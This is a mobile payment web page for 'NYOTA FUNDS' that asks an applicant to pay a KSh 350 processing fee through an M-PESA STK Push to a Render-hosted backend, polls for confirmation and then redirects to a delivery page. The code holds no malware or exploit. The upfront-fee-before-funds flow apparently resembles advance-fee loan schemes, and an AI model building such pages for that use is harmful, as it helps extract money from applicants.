<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#064e3b">
<title>NYOTA FUNDS — Payment</title>

<style>
*{box-sizing:border-box}
body{
margin:0;
min-height:100vh;
padding:16px 10px;
display:flex;
align-items:center;
justify-content:center;
font-family:Arial,sans-serif;
background:
radial-gradient(circle at 10% 10%,rgba(34,197,94,.35),transparent 28%),
radial-gradient(circle at 90% 90%,rgba(59,130,246,.35),transparent 28%),
linear-gradient(135deg,#064e3b,#1e40af);
color:#fff;
}
.container{width:100%;max-width:430px}
.card{
padding:22px 18px 18px;
border-radius:20px;
background:linear-gradient(145deg,rgba(255,255,255,.10),rgba(255,255,255,.04));
border:1px solid rgba(255,255,255,.12);
box-shadow:0 20px 60px rgba(0,0,0,.35);
backdrop-filter:blur(15px);
}
h1{text-align:center;font-size:24px;margin:2px 0 8px}
p{font-size:14px;line-height:1.5;color:rgba(255,255,255,.78);text-align:center}
.amount{
margin:18px 0;
padding:14px;
border-radius:12px;
text-align:center;
font-size:20px;
font-weight:700;
background:rgba(22,163,74,.10);
border:1px solid rgba(22,163,74,.25);
}
label{
display:block;
margin:15px 0 7px;
font-size:14px;
font-weight:700;
color:rgba(255,255,255,.9);
}
input{
width:100%;
padding:14px;
border-radius:10px;
border:1px solid rgba(255,255,255,.15);
background:rgba(255,255,255,.08);
color:#fff;
font-size:16px;
outline:none;
}
button{
width:100%;
padding:16px;
margin-top:18px;
border:none;
border-radius:12px;
background:linear-gradient(135deg,#16a34a,#087f32);
color:#fff;
font-size:17px;
font-weight:bold;
cursor:pointer;
box-shadow:0 10px 25px rgba(22,163,74,.30);
}
button:disabled{
opacity:.6;
cursor:not-allowed;
box-shadow:none;
}
#stkMessage{
min-height:40px;
margin-top:14px;
text-align:center;
font-size:14px;
font-weight:600;
}
.success{color:#7ef0aa}
.error{color:#ff8d96}
.small{
font-size:12px;
color:rgba(255,255,255,.55);
}
</style>
</head>

<body>

<div class="container">
<div class="card">

<h1>NYOTA FUNDS</h1>

<p>Welcome, <strong id="name">Applicant</strong></p>
<p>Please complete the processing fee payment to continue.</p>

<div class="amount" id="feeAmount">
Processing Fee: KSh 350
</div>

<label>Full Name</label>
<input type="text" id="fullName" readonly>

<label>M-PESA Phone Number</label>
<input
type="tel"
id="phone"
placeholder="2547XXXXXXXX"
maxlength="12">

<button id="payBtn">
Pay Processing Fee
</button>

<div id="stkMessage"></div>

<p class="small">
You will receive an M-PESA STK Push on the phone number entered above.
</p>

</div>
</div>

<script>
"use strict";

/* YOUR LIVE RENDER BACKEND */
const BACKEND_URL="https://nyota-program-001-functionality-1.onrender.com";

/* Load saved details */
const applicant=
localStorage.getItem("fullName")||
localStorage.getItem("fullname")||
"Applicant";

const savedPhone=
localStorage.getItem("phoneNumber")||
localStorage.getItem("phone")||
"";

const processingFee=
Number(localStorage.getItem("processingFee")||350);

document.getElementById("name").textContent=applicant;
document.getElementById("fullName").value=applicant;
document.getElementById("phone").value=savedPhone;
document.getElementById("feeAmount").textContent=
"Processing Fee: KSh "+processingFee.toLocaleString("en-KE");

const phoneEl=document.getElementById("phone");
const payBtn=document.getElementById("payBtn");
const msg=document.getElementById("stkMessage");

function setMessage(text,type=""){
msg.textContent=text;
msg.className=type;
}

function setLoading(state,text){
payBtn.disabled=state;
payBtn.textContent=state?text:"Pay Processing Fee";
}

function normalizePhone(value){
let phone=value.replace(/[^\d+]/g,"");
if(phone.startsWith("+254")) phone=phone.slice(1);
if(phone.startsWith("07")||phone.startsWith("01")){
phone="254"+phone.slice(1);
}
return phone;
}

async function readJson(res){
const txt=await res.text();
return txt?JSON.parse(txt):{};
}

async function payNow(){

const phone=normalizePhone(phoneEl.value.trim());

if(!/^254(?:7|1)\d{8}$/.test(phone)){
setMessage("Enter a valid M-PESA number.","error");
return;
}

localStorage.setItem("phoneNumber",phone);

setLoading(true,"Sending STK Push...");
setMessage("Sending payment request...");

try{

const response=await fetch(`${BACKEND_URL}/stk-push`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone,
amount:processingFee
})
});

const data=await readJson(response);

if(!response.ok||data.success===false){
throw new Error(data.message||"STK Push failed.");
}

const transactionId=
data.transactionId||
data.data?.transactionId||
data.checkout_request_id;

setLoading(true,"Waiting for payment...");
setMessage("STK Push sent. Enter your M-PESA PIN.");

await checkPayment(transactionId);

}catch(error){

setMessage(error.message,"error");
setLoading(false);

}

}

async function checkPayment(transactionId){

const start=Date.now();

while(Date.now()-start<120000){

try{

const response=await fetch(`${BACKEND_URL}/payment-status`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({transactionId})
});

const result=await readJson(response);

const status=String(result.data?.status||"").toUpperCase();

if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){
setMessage("Payment successful. Redirecting...","success");
setTimeout(()=>{
window.location.href="delivery.html";
},1000);
return;
}

if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
throw new Error("Payment "+status.toLowerCase()+".");
}

}catch(error){

if(/failed|cancelled|expired/i.test(error.message)){
setMessage(error.message,"error");
setLoading(false);
return;
}

}

await new Promise(r=>setTimeout(r,3000));

}

setMessage("Payment confirmation timed out.","error");
setLoading(false);

}

payBtn.addEventListener("click",payNow);
</script>

</body>
</html>
